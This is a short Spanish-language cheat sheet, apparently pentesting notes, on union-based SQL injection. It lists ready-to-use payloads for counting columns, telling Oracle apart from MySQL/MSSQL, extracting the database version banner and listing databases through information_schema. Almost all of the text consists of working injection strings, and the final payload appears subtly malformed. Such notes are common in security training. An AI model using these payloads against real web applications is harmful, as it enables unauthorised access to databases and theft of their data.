## Identificación de versión y motor de base de datos
#### ORACLE
Identificar el numero de columnas
`' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, al no mostrarnos nada es una pista de que puede ser una base de datos ORACLE para ello deberemos referenciar a una tabla
`' union select 'a','b' from dual-- -`, dual es una tabla que esta siempre presente en las beses de datos de ORACLE

Para extraer la versión
`' union select 'a',banner from v$version-- -`, nos devolverá toda la información de la base de datos

#### MySQL y MSSQL
Identificar el numero de columnas
`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select en la pagina por lo cual identificamos que es una base de datos MySQL o MSSQL

Para extraer la versión
`' union select 1,@@version-- -`, nos devolvera toda la informacion de la base de datos

Para enumerar las bases de datos exisitentes
`' union select 1,schema_name from information_schema-- -`

